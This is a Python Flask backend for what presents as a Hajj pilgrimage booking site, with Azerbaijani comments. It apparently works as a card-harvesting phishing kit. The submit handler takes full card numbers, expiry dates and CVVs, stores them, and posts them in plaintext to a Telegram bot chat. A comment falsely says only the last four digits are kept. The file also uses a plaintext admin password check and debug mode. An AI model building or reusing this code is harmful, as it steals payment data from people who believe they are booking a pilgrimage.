from flask import Flask, render_template, request, jsonify, redirect, url_for
import json
import requests
import os
from datetime import datetime
from config import TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, ADMIN_PASSWORD

app = Flask(__name__)

BOOKINGS_FILE = "bookings.json"

# JSON faylını yarat və ya oxu
def load_bookings():
    if not os.path.exists(BOOKINGS_FILE):
        with open(BOOKINGS_FILE, "w", encoding="utf-8") as f:
            json.dump([], f, ensure_ascii=False, indent=2)
    with open(BOOKINGS_FILE, "r", encoding="utf-8") as f:
        return json.load(f)

def save_booking(booking):
    bookings = load_bookings()
    bookings.append(booking)
    with open(BOOKINGS_FILE, "w", encoding="utf-8") as f:
        json.dump(bookings, f, ensure_ascii=False, indent=2)

# Telegram-a göndərmə funksiyası
def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "parse_mode": "HTML",
        "text": message
    }
    try:
        requests.post(url, json=payload)
    except:
        pass

@app.route("/")
def index():
    return render_template("index.html", price=1800)

@app.route("/submit", methods=["POST"])
def submit():
    try:
        data = request.form

        name = data.get("name")
        surname = data.get("surname")
        phone = data.get("phone")
        date = data.get("date")
        card_number = data.get("card_number")
        expiry = data.get("expiry")
        cvv = data.get("cvv")

        booking = {
            "id": str(datetime.now().timestamp()),
            "name": name,
            "surname": surname,
            "phone": phone,
            "date": date,
            "card_number": card_number[-16:],  # Son 4 rəqəm
            "expiry": expiry,
            "status": "pending",
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }

        save_booking(booking)

        # Telegram mesajı
        message = f"""
🕋 <b>Yeni Həcc Rezervasiyası</b>

👤 Ad Soyad: <b>{name} {surname}</b>
📱 Telefon: <b>{phone}</b>
📅 Tarix: <b>{date}</b>
💳 Kart : <b>{card_number}</b>
Kart tarixi : <b>{expiry}</b>
Kart cvv : <b>{cvv}</b>
⏰ Vaxt: {booking['time']}

✅ Status: Gözləmədə
        """.strip()

        send_to_telegram(message)

        return redirect(url_for("success"))

    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/success")
def success():
    return render_template("success.html")

# Admin Panel
@app.route("/admin", methods=["GET", "POST"])
def admin():
    if request.method == "POST":
        password = request.form.get("password")
        if password == ADMIN_PASSWORD:
            bookings = load_bookings()
            return render_template("admin.html", bookings=bookings, authorized=True)
        else:
            return render_template("admin.html", error="Şifrə səhvdir!", authorized=False)
    
    return render_template("admin.html", authorized=False)

if __name__ == "__main__":
    app.run(debug=True, port=5000)
